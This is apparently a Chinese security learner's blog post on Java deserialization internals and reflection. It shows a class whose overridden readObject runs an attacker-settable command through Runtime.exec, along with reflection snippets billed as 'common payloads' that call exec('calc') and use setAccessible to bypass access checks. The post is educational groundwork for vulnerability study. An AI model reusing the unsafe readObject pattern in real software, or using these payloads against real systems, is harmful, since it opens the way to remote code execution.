关于大佬的代码我有几个疑问：\nRuntime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;); 只能够控制弹出一个计算器，我能不能使用一个字符串变量代替（PHP反序列化的经验告诉我应该是可行的），进而轻松改变将要执行的命令？\nUnsafeClass0 的 readObject 是何时被执行的，是被谁调用的（因为当我查看下图readObject执行时的源码时 跳转的是ObjectInputStream类的readObject 那么是什么时候调用的UnsafeClass0的readObject呢？（强转类型的时候吗？）\n第一个问题 关于第一个问题，只需要将断点打到Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);，然后观察变量就不难看出可以使用this.command打到我想要的效果，所以修改代码为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ ---- Unsafe.name = \u0026#34;hacked by D4n\u0026#34;; Unsafe.command = \u0026#34;notepad\u0026#34;;//增加 ---- } } class UnsafeClass0 implements Serializable{ --- public String command; //增加 //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ --- Runtime.getRuntime().exec(this.command); //修改 } } 此时只需要控制 Unsafe 对象的 command 属性值即可执行不同命令\n但是在分析第一个问题的时候，刚进入 UnsafeClass0的readObject()方法的时候，this还没有被赋值\n再步过in.defaultReadObject();的时候，this 的变量值就被赋值成了我们设置的样子： 所以我想跟进一下，关于this变量是什么时候怎么样被赋值的，所以应该着重分析in.defaultReadObject();干了哪些事，并且在此之前，其他相关反序列化代码做的事只是创建好对象，开辟好空间，没有赋值操作（猜测）\n新问题：关于this变量是什么时候怎么样被赋值的（序列化字符串是怎么一步一步变成对象的）\n让我们进入in.defaultReadObject();看看 没法直接步入，所以要先 ctrl + B 进入源码后再打断点 贴个源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public void defaultReadObject() throws IOException, ClassNotFoundException { SerialCallbackContext ctx = curContext; if (ctx == null) { throw new NotActiveException(\u0026#34;not in call to readObject\u0026#34;); } Object curObj = ctx.getObj(); ObjectStreamClass curDesc = ctx.getDesc(); bin.setBlockDataMode(false); // Read fields of the current descriptor into a new FieldValues FieldValues values = new FieldValues(curDesc, true); if (curObj != null) { values.defaultCheckFieldValues(curObj); values.defaultSetFieldValues(curObj); } bin.setBlockDataMode(true); if (!curDesc.hasWriteObjectData()) { /* * Fix for 4360508: since stream does not contain terminating * TC_ENDBLOCKDATA tag, set flag so that reading code elsewhere * knows to simulate end-of-custom-data behavior. */ defaultDataEnd = true; } ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } } 其中第一句赋值完成后就可以看到 ctx中已经存放好了 UnsafeClass0 类的未初始化对象（实际从地址来看就是在in.defaultReadObject();调用时的\u0026quot;this变量\u0026quot;，为了方便称呼，我称之为UnsafeClass0--this\nSerialCallbackContext类理解\n之后\nObject curObj = ctx.getObj();将this地址值赋值给 curObj，即 curObj 是UnsafeClass0--this的引用\nObjectStreamClass curDesc = ctx.getDesc();将对象流赋值给 curDesc 查看 curDesc 发现\n猜测这里存放的是对象属性以及对应值，粗略查看没有找到具体数据，过\nbin.setBlockDataMode(false); BlockDataInputStream 这句的粗略理解就是一个流程控制，暂时无关我需要分析的问题，过 问题1-2：关于this变量是什么时候怎么样被赋值的\nFieldValues values = new FieldValues(curDesc, true); 这句执行之后 curObj暂时没有发生变化\n所以先不去查看FieldValues在做什么事情，根据构造的传参猜测大致是对 类描述进行处理\n接下来进入 if判断\n（ curObj 不为空 ）\n执行完values.defaultSetFieldValues(curObj);之后，curObj的值就被设置好了，果然使用到了 FieldValues类的对象values，跟进一下values.defaultSetFieldValues(curObj);\ndefaultSetFieldValues()第一个IF判断false，第二个判断Ture，将要修改的对象Obj 传入desc.setObjFieldValues(obj, objValues);，跟进前看看objValues是个什么东西\n发现值已经被设置好了，那setObjFieldValues()做的可能只是复制objValues里的值给Obj，此时UnsafeClass0--this就已经改变了\n新问题：objValues 是什么时候赋值的呢\n跟进看一下\n这里就是在往objValues里写东西了，看看readObject0如何解析的（f.isUnshared()返回一个布尔值）\n经历一系列类似流程控制的东西，最后来到了这\n先看看 readString 在干嘛：\n先完整执行一遍，发现路过那条switch语句的时候，str就能被赋值为序列化字符串里的关键字\n说明readUTF是在从序列化字符串中提取数据，看看 bin 是个什么东西\nbin里是已经处理好的序列化字符串碎片，那么是哪个函数在处理整个序列化字符串呢？（找到给bin赋值的语句）\n直接看看不出什么端倪，看来只有跟着断点走一次\n走一次，没有找到给bin.cbuf赋值的地方，但是有意外收获：\n这不就是妥妥的咱要找的东西吗，sigs的来源找到了，怎么赋值给bin.cbuf就暂时不深究了（毕竟其实很想看到的就是如何从序列化中提取出之前写入的序列化数据）\n这里的代码是这样的：\n查看一下这个sigs能在哪些地方被赋值\n看来就只有sigs[j++] = f.getName();sigs[j++] = f.getSignature();这两个地方，康康f.getName()和f.getSignature()在干嘛\n，，，，他没干嘛，所以看看 f 怎么来的 （可恶，对 get set 类函数还是不够敏感，但是也算严谨，，，，）\nObjectStreamField f = fields[i];，所以得看看fields是怎么来的 Field类说明\n这里的fields是直接传参进来的，而且这里是FieldReflectorKey类的构造函数，康康谁在new呢？\n这里的fields哪来的？\n这里的fields也是传参，再跟！\n这里发现给fields赋值的地方有些多，重新debug看看\n多次尝试，发现赋值的地方在：\n再路过就已经处理好啦，跟进：\n这步赋值，跟进：\n这步又是已经被处理好了（怎么这么多检测）重新在Field[] clFields = cl.getDeclaredFields();处打个断点，重新看看\n又是被处理好的，重新跟踪rd\n又，调用的时候已经有了，，，经过反复调试，终于找到一个像是最初处理的函数\n但是已经没有办法追踪了，getDeclaredFields0(publicOnly)粗略理解：\n​\tgetDeclaredFields0() 是 Java 中 Class 类的一个本地方法，实际上是使用 C 或 C++ 等本地语言编写的。本地方法是 Java 中与底层操作系统和硬件交互的一种机制，可以让 Java 程序能够调用底层操作系统提供的本地功能和资源。 ​\tJava 语言本身并不支持底层操作系统和硬件的访问，因此需要使用本地方法来扩展 Java 的能力。本地方法通常由本地库（native library）实现，本地库是一个动态链接库（.dll 或 .so 文件），其中包含了本地方法的实现。在 Java 中，可以使用 System.loadLibrary() 或 System.load() 方法来加载本地库，从而使 Java 程序能够调用本地方法。 ​\t在 Class 类中，getDeclaredFields0() 方法是使用本地语言编写的本地方法，它实现了获取一个类中声明的所有成员变量的功能。当 Java 程序调用 getDeclaredFields() 方法时，实际上是调用了 getDeclaredFields0() 方法的 Java 封装，而这个封装方法会通过 JNI（Java Native Interface）机制来调用本地方法的实现。\n但是getDeclaredFields0(publicOnly)只是获得了类里声明的成员变量，并没有给其赋值，具体的值是什么时候抽取出来的？\n重新调整思路，一路debug寻找，找到了readUTFBody：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 private String readUTFBody(long utflen) throws IOException { StringBuilder sbuf; if (utflen \u0026gt; 0 \u0026amp;\u0026amp; utflen \u0026lt; Integer.MAX_VALUE) { // a reasonable initial capacity based on the UTF length int initialCapacity = Math.min((int)utflen, 0xFFFF); sbuf = new StringBuilder(initialCapacity); } else { sbuf = new StringBuilder(); } if (!blkmode) { end = pos = 0; } while (utflen \u0026gt; 0) { int avail = end - pos; if (avail \u0026gt;= 3 || (long) avail == utflen) { utflen -= readUTFSpan(sbuf, utflen); } else { if (blkmode) { // near block boundary, read one byte at a time utflen -= readUTFChar(sbuf, utflen); } else { // shift and refill buffer manually if (avail \u0026gt; 0) { System.arraycopy(buf, pos, buf, 0, avail); } pos = 0; end = (int) Math.min(MAX_BLOCK_SIZE, utflen); in.readFully(buf, avail, end - avail); } } } return sbuf.toString(); } 粗略理解一下：\nreadUTFBody，它的作用是从输入流中读取指定长度的UTF-8字符串，并将其转换为Java的String类型返回。\n具体来说，代码的主要逻辑如下：\n根据指定的 utflen（表示UTF-8编码的字节数）创建一个 StringBuilder 对象 sbuf，作为存储解码后字符串的缓冲区。如果 utflen 在 0 和 Integer.MAX_VALUE 之间，则设置 sbuf 的初始容量为 utflen 和 0xFFFF 之间的较小值，以提高性能。\n如果当前输入流不处于块模式，则将输入流的 pos 和 end 分别设置为0，表示当前没有读取任何数据。\n进入一个while循环，循环条件是utflen大于0，即还需要继续读取字符串。\n在每次循环中，根据输入流的 pos 和 end 计算当前可用的字节数 avail。如果 avail 大于等于3，或者与 utflen 相等，则调用 readUTFSpan() 方法读取一段连续的字节，并将其解码成字符串，将解码后的字符串追加到 sbuf 中，并将已经读取的字节数从 utflen 中减去。\n如果avail小于3且不等于 utflen ，则分两种情况处理：\n如果当前输入流处于块模式，则说明接近块边界，便逐个字节地读取剩余字节，调用readUTFChar函数读取一个字符，将解码后的字符追加到 sbuf 中，并将已经读取的字节数从 utflen 中减去。 如果当前输入流不处于块模式，则手动移动剩余字节到缓冲区的开头，重新填充缓冲区，将 pos 和 end 分别设置为0和新的可读取字节数，然后继续循环读取数据。 在while循环结束后，返回 sbuf 缓冲区中存储的解码后的字符串，即读取的UTF-8字符串。\n需要注意的是，在读取字节和解码字符串的过程中，如果遇到任何错误（如读取字节失败、解码失败等），则会抛出 IOException 或UTFDataFormatException 异常。\n简单来说就是把字节流转换成字符串的函数，字节流是从buff变量里面读取的，buff是什么时候赋值的呢 in.readFully()\n所以完整序列化数据到对象的过程：\nin.readFully()读入指定位置和字数的字节到buff，readUTFBody()和readUTFSpan()控制buff字节流的同时读出里面的属性名与其对应属性，返回到ObjectStreamClass里组装到fields里，然后返回值一路返回到ObjectInputStream类里，这之前都是为了生成对类的细节描述“des”：类名，属性名，属性类型，做好了对象的框架后最后再ObjectStreamClass里对类进行了实例化\n调用的也是反射类的实例函数：\n最后在ObjectInputStream里obj接收到了返回的实例化好的空的UnsafeClass0对象\n此时再次调试发现回到了我们定义的类里面\n所以可以确定了，在执行UnsafeClass0.readObject中的in.defaultReadObject();之前，都只是在初始化一个UnsafeClass0类的实例化对象，此时再进入defaultReadObject进行值的赋\ndefultReadObject做的是就是拿到当前需要赋值的ObjcurObj和当前处理好的对该Obj的描述curDesc然后在创建FieldValuse对象初始化\n这次初始化也是通过调用\nreadUTF等一系列方法对序列化字节进行处理得到具体值\n通过curDesc拿到该赋的具体值给curObj赋值，即可完成反序列化\n第二个问题 UnsafeClass0 的 readObject 是有参数的，所以UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject();肯定不是直接调用 UnsafeClass0 中的 readObject，那是谁调用的呢？可以通过函数栈观察\n调用情况使用 =\u0026gt; 表示\nmain =\u0026gt; ObjectInputStream.readObject =\u0026gt; ObjectInputStream.readObject0 =\u0026gt; ObjectInputStream.readOrdinaryObject =\u0026gt; ObjectInputStream.readSerialData =\u0026gt; ObjectStreamClass.invokeReadObject =\u0026gt; Method.invoke =\u0026gt; 然后一堆看不懂的 =\u0026gt; UnsafeClass0.readObject\n看到熟悉的 Method.invoke了吗，（好吧其实也不是很熟）Java也是通过反射来调用 UnsafeClass0.readObject\n至此，反序列化的初步理解就告一段落了\nPOP链 ​\tPOP（Property-Oriented Programming）直译的话就是面向属性编程，如果学过二进制的话就可以类比一下ROP。 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。\n​\t作者个人理解：从可控的输入点到最终的代码执行点一般不是直达的，此时需要精心构造或者寻找一些能够在不同对象，方法之间跳转的跳板函数或者跳板对象。且这些跳板本身可能并不是用作跳板用途，有时候的跳板可能只是利用了相关函数的设计机制（例如PHP中访问一个对象不存在的方法时会被调用该对象的__class__魔术方法）\n​\t在之后的文章中，会深刻的领悟到POP的精髓\n反射 要知道什么是反射，首先就要知道\u0026quot;正射\u0026quot;是怎么样的\n一般情况下，我们使用某个类前，我们是知道这个类的类名的，比如实例化对象的时候\n1 2 Apple apple = new Apple(); //直接初始化，「正射」 apple.setPrice(4); 类似这种知道要初始化类的类名，并将其写死在代码中，运行时无法更改的，就可以称之为正射\n反射的话就是和正射反着来，程序运行起来之前，我并不知道我需要初始化类的类名叫什么，所以我无法在代码中写死\n举一个不恰当但是很合适的需求：我需要使用Java写一个程序，在其运行期间，我每输入一个类的名字，Java程序就帮我实例化好这个类对象，将其序列化成字节流，并创建写入一个文件，路径和我的工作路径相同，文件名就是我输入的类的名字，其中对象的整形属性按照变量名的字母数赋值，其他类型的属性赋值为 Null\n如果没有在其运行期间这个前提条件的话，实现这个需求我们可以手动 new 出对象来，然后数出变量名字母数，然后序列化好放入文件中\n​\t反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。\n但是在运行期间的话，只能使用到反射了（举例到此为止，接下来的代码不解决上诉需求）\n我们可以使用 JDK 提供的反射 API 进行反射调用\n1 2 3 4 5 Class clz = Class.forName(\u0026#34;com.dan.Apple\u0026#34;); Method method = clz.getMethod(\u0026#34;setPrice\u0026#34;, int.class); Constructor constructor = clz.getConstructor(); Object object = constructor.newInstance(); method.invoke(object, 4); 这两段代码的能实现相同的作用，但是第二段代码获取类实例化对象时，类名是通过字符串获取的\n反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。\n接下来先看看使用反射我们能简单干些什么，怎么使用反射\n获取Class对象 在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。\n有三种方法\n第一种，使用 Class.forName 静态方法。当你知道该类的全路径名时，你可以使用该方法获取 Class 类对象。\nClass clz = Class.forName(\u0026quot;java.lang.String\u0026quot;);\n第二种，使用 .class 方法。\n这种方法只适合在编译前就知道操作的 Class 名\nClass clz = String.class;\n第三种，使用类对象的 getClass() 方法\nString str = new String(\u0026quot;Hello\u0026quot;); Class clz = str.getClass();\n这三种获取CLass类方式中，我们一般使用第一种通过Class.forName方法去动态加载类。且使用 forName 就不需要import导入其他类，可以加载我们任意的类。 使用第二种类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误； 使用第三种实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。 所以我们在获取class对象中，一般使用第一种Class.forName方法去获取。\n获取成员变量Field 获取成员变量Field位于java.lang.reflect.Field包中\nField[] getFields() ：获取所有public修饰的成员变量\nField[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符\nField getField(String name) 获取指定名称的 public修饰的成员变量\nField getDeclaredField(String name) 获取指定的成员变量\n用一个例子理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import java.lang.reflect.Field; public class FieldTest { public String name; public String profession; protected int age; private String number; char sex; public static void main(String[] args){ try{ Class c1 = Class.forName(\u0026#34;com.dan.FieldTest\u0026#34;); // 创建Class对象 Field[] fieldArray1 = c1.getDeclaredFields(); //获取全部成员变量 Field[] fieldArray2 = c1.getFields();// 获取全部public成员变量 for (Field field : fieldArray1){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Field field : fieldArray2){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Field fieldArray3 = c1.getField(\u0026#34;name\u0026#34;); // 获取指定名称的public修饰的成员变量 System.out.println(fieldArray3.getName()); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Field fieldArray4 = c1.getDeclaredField(\u0026#34;number\u0026#34;); // 获取指定的成员变量 System.out.println(fieldArray4.getName()); } catch (Exception e) { e.printStackTrace(); } } } 获取成员方法Method Method getMethod(String name, 类\u003c?\u003e\u0026hellip; parameterTypes) //返回该类所声明的public方法\nMethod getDeclaredMethod(String name, 类\u003c?\u003e\u0026hellip; parameterTypes) //返回该类所声明的所有方法\n//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型\nMethod[] getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法\nMethod[] getDeclaredMethods() // 获取该类中的所有方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import java.lang.reflect.Method; public class MethodTest { public void study(String s) { System.out.println(\u0026#34;学习中...\u0026#34; + s); } protected void run() { System.out.println(\u0026#34;跑步中...\u0026#34;); } void eat() { System.out.println(\u0026#34;吃饭中...\u0026#34;); } private String sleep(int age) { System.out.println(\u0026#34;睡眠中...\u0026#34; + age); return \u0026#34;sleep\u0026#34;; } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.MethodTest\u0026#34;); // 创建Class对象 Method[] methods1 = c.getDeclaredMethods(); // 获取所有该类中的所有方法 Method[] methods2 = c.getMethods(); // 获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法 for (Method m:methods1) { System.out.println(m.); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Method m:methods2) { System.out.println(m); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Method methods3 = c.getMethod(\u0026#34;study\u0026#34;, String.class); // 获取study方法 System.out.println(methods3); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Method method4 = c.getDeclaredMethod(\u0026#34;sleep\u0026#34;, int.class); // 获取sleep方法 System.out.println(method4); } catch (Exception e) { e.printStackTrace(); } } } 运行结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //public static void com.dan.MethodTest.main(java.lang.String[]) //protected void com.dan.MethodTest.run() //private java.lang.String com.dan.MethodTest.sleep(int) //public void com.dan.MethodTest.study(java.lang.String) //void com.dan.MethodTest.eat() //-------分割线--------- //public static void com.dan.MethodTest.main(java.lang.String[]) //public void com.dan.MethodTest.study(java.lang.String) //public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException //public final void java.lang.Object.wait() throws java.lang.InterruptedException //public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException //public boolean java.lang.Object.equals(java.lang.Object) //public java.lang.String java.lang.Object.toString() //public native int java.lang.Object.hashCode() //public final native java.lang.Class java.lang.Object.getClass() //public final native void java.lang.Object.notify() //public final native void java.lang.Object.notifyAll() //-------分割线--------- //public void com.dan.MethodTest.study(java.lang.String) //-------分割线--------- //private java.lang.String com.dan.MethodTest.sleep(int) // //Process finished with exit code 0 获取构造函数 Constructor\u003c?\u003e[] getConstructors() ：只返回public构造函数\nConstructor\u003c?\u003e[] getDeclaredConstructors() ：返回所有构造函数\nConstructor\u0026lt;\u0026gt; getConstructor(类\u003c?\u003e\u0026hellip; parameterTypes) : 匹配和参数配型相符的public构造函数\nConstructor\u0026lt;\u0026gt; getDeclaredConstructor(类\u003c?\u003e\u0026hellip; parameterTypes) ： 匹配和参数配型相符的构造函数\n例子总比文字好理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import java.lang.reflect.Constructor; public class ConstructorTest { public ConstructorTest() { System.out.println(\u0026#34;无参构造函数\u0026#34;); } public ConstructorTest(String name) { System.out.println(\u0026#34;有参构造函数\u0026#34; + name); } private ConstructorTest(boolean n) { System.out.println(\u0026#34;私有构造函数\u0026#34;); } public static void main(String[] args) { try { Class c1 = Class.forName(\u0026#34;com.dan.ConstructorTest\u0026#34;); Constructor[] constructors1 = c1.getDeclaredConstructors(); Constructor[] constructors2 = c1.getConstructors(); for (Constructor c : constructors1) { System.out.println(c); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Constructor c : constructors2) { System.out.println(c); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Constructor constructors3 = c1.getConstructor(String.class); System.out.println(constructors3); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Constructor constructors4 = c1.getDeclaredConstructor(boolean.class); System.out.println(constructors4); } catch (Exception e) { e.printStackTrace(); } } } 获取对象 先获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\n根据 Class 对象实例获取 Constructor 函数 Constructor appleConstructor = clz.getConstructor();\n使用 Constructor 对象的 newInstance 方法获取反射类对象 Apple appleObj = (Apple)appleConstructor.newInstance();\n或者也可以使用 Class对象 的newInstance()方法来进行创建类对象\nApple appleObj = (Apple)clz.newInstance();\n区别在于通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码是使用一个有参数的构造方法进行了类对象的初始化\n1 2 3 Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\u0026#34;红富士\u0026#34;, 15); 常用的是如下实例：\n1 2 Class clz = Class.forName(\u0026#34;com.api.Apple\u0026#34;); // 创建Class对象 Apple appleObj = (Apple) clz.newInstance(); // 创建类对象 调用方法步骤 获取对象使用的是 newInstance()，那么调用函数使用的就是invoke()\ninvoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法。一般会和getMethod方法配合进行调用。\ninvoke使用小Tips：\npublic Object invoke(Object obj, Object... args)\nobj：从中调用底层方法的对象，必须是实例化对象 如果调用的这个方法是普通方法**，**第一个参数就是目标类实例化对象； 如果调用的这个方法是静态方法，第一个参数就是Class对象；\nargs： 用于方法的调用，是一个object的数组，参数有可能是多个\n基本步骤\n获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\n获取方法的 Method 对象 Method setPriceMethod = clz.getMethod(\u0026quot;setPrice\u0026quot;, int.class);\n利用 Method 对象的 invoke 方法调用方法（本例子需要提前准备实例化对象） setPriceMethod.invoke(appleObj, 14);\n调用方法完整小例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.dan; import java.lang.reflect.Method; public class ReflectTest { public void reflectMethod() { System.out.println(\u0026#34;反射测试成功!!!\u0026#34;); } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.ReflectTest\u0026#34;); // 创建Class对象 Object m = c.newInstance(); // 创建类实例对象 Method method = c.getMethod(\u0026#34;reflectMethod\u0026#34;); // 获取reflectMethod方法 method.invoke(m); // 调用类实例对象方法 } catch (Exception e) { e.printStackTrace(); } } } ​\t上面讲述了反射机制流程概念和基本使用方法，从Class对象获取，到获取成员变量、成员方法和构造函数，接着是newInstance创建类对象和invoke方法，最后是一个简单反射例子的组成。\n回归到漏洞学习中，看看如何使用java反射中如何获取Runtime类来命令执行\n1 2 3 4 5 6 7 8 9 10 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Object b = a.newInstance(); Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); c.invoke(b,\u0026#34;calc\u0026#34;); } } 上面的例子会报错：\n但我们发现了使用newInstance产生了报错的话，而往往其可能是以下原因未能实现。\n1、使用的类没有无参构造函数 2、使用的类构造函数是私有的\n构造函数私有化 上例报错是因为构造函数私有，构造函数私有有如下作用：\n单例模式\n单例模式主要有3个特点：\n类的内部包括一个类的实例，并且为static类型\n构造函数为私有\n通过提供一个获取实例的方法，比如getInstance，该方法也为static类型。 调用的时候，我们可以通过某些特殊静态函数例如Singleton instance = Singleton.getInstance();来获得实例化的对象\n单例模式的使用： 很多时候，我们只需要一个对象就可以了，不希望用户来构造对象，比如线程池，驱动，显示器等。如果把构造函数私有，那么很多程序都可以得到其实例，将会带来混乱。\n防止实例化\n在Java的工具类中，有很多就是利用这种方法\n一个工具类Utils，里面含有很多静态函数或者静态变量，由于静态的原因，我们完全可以通过类名来访问，这样，我们就没有必要实例化它们，所以我们可以将其构造函数设置为私有，这样就防止用户滥用。\nRuntime也是一个工具类，所以构造函数有私有的必要\n那我们应该怎么构造呢？原本弹计算器应该是这样的：\nRuntime.getRuntime().exec(\u0026quot;calc\u0026quot;);\n可以看到是通过getRuntime()方法获得的实例化对象\n那么我们可以先使用反射调用静态方法获得对象后再执行exec()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); // Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); // Object b = a.newInstance(); // Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); // c.invoke(b,\u0026#34;calc\u0026#34;); Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method rundan = a.getMethod(\u0026#34;getRuntime\u0026#34;); Object b = rundan.invoke(a); Method run1 = a.getMethod(\u0026#34;exec\u0026#34;, String.class); run1.invoke(b,\u0026#34;calc\u0026#34;); } } 此例便可以弹出计算机了\n如果将这些代码简化一下，就可以得到\n1 2 Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(a.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(a),\u0026#34;calc\u0026#34;); 常见的反射payload\n如果就想使用newInstance()来获得构造呢，在之前获得对象中有提到\n使用 Constructor 对象的 newInstance 方法获取反射类对象\n所以可以先试试\n1 2 3 4 5 6 7 8 9 10 11 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); System.out.println(cs); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String[].class).invoke(o,\u0026#34;calc\u0026#34;); } } 但是依旧报错：\n佬说需要通过setAccessible(true)来突破访问权限的检查\n​\t在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。\n​\tJava.lang.reflect.AccessibleObject 类是Field，Method和Constructor类对象的基类，它提供了标记反射对象的能力，以抑制在使用时使用默认Java语言访问控制检查，从而能够任意调用被私有化保护的方法、域和构造函数，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。\nsetAccessible()是AccessibleObject类的public函数，该类被Executable继承，之后Executable又被Constructor继承\n所以可以使用Field，Method和Constructor类的实例化对象去访问该函数，代码改进为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); cs.setAccessible(true); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(o,\u0026#34;calc\u0026#34;); } } 还是报错，，，，\n猜测是Java版本过新，解决办法：\n如果没有类似我一样的方框的话，找到 Modify options ，去里面把\n这个勾选上就有了，方框里填--add-opens java.base/java.lang=ALL-UNNAMED\n最后运行，成功弹出计算器\n​\t在实际利用场景当中，我们通常利用Java反射机制来绕过一些安全权限机制检查，如获取private权限的方法和属性。本质就是我们绕过访问安全检查。所以通过java反射机制的学习，能够为我们为我们后面的java漏洞分析调试，java漏洞poc测试和服务端模板引擎注入等有着十分重要的意义。\n泛型 关于泛型的介绍可以参考链接（Java泛型详解，史上最全图文详解）\n相关补充 Field类粗略理解\n​\tJava中的Field类是反射机制的一部分，它的设计初衷是为了在运行时动态地获取和操作类的成员变量，包括私有变量。使用Field类可以获取类中的所有变量信息，包括变量名、类型、访问修饰符等，并可以通过它们进行读取、修改或设置新的值。 ​\tField类的设计使得开发者可以在运行时获取和操作类的成员变量，这在某些情况下是非常有用的，例如：\n当需要通过反射获取或设置某个类的私有变量时； 当需要动态地创建对象或者通过反射调用对象的方法时，需要访问对象中的成员变量； 当需要实现某些自定义的序列化或者反序列化机制时，需要获取或设置对象中的成员变量。 因此，Field类的设计初衷是为了提供一种方便的方式，使得开发者可以在运行时动态地获取和操作类的成员变量。\nSerialCallbackContext类理解\nctx 是一个 SerialCallbackContext 类对象， SerialCallbackContext类是内部类，无法在包（java.io）外引用，且该类为final，无法被继承，该类的描述：\n大意就是\n从对象流向上调用类定义的readObject/writeObject方法时的上下文。保存当前被反序列化的对象和当前类的描述符。这个上下文跟踪构造它的线程，并且只允许一个defaultReadObject, readFields, defaultWriteObject或writeFields的调用，这些必须在类的readObject/writeObject方法返回之前在同一个线程上调用。如果未设置为当前线程，getObj方法将抛出NotActiveException。\n有如下成员变量：\n被操作的Object，内含的对象流类，当前操作线程\n1 2 3 private final Object obj; private final ObjectStreamClass desc; private Thread thread; 参考链接 Java反序列化漏洞从入门到深入\nJAVA反序列化漏洞基础原理\nJava 中序列化与反序列化，看这篇就够了！\nJava 日看一类（53）之IO包中的SerialCallbackContext类\nJava I/O 25 - BlockDataInputStream\n大白话说Java反射：入门、使用、原理\nJAVA安全基础（二）\u0026ndash; 反射机制\nJava私有构造函数的使用\nJava泛型详解，史上最全图文详解\n","date":"2023-04-06T00:00:00Z","permalink":"https://d4n-sec.github.io/p/d4n%E7%9A%84java%E5%AE%89%E5%85%A8%E8%B7%AF/","title":"D4n的Java安全路"}]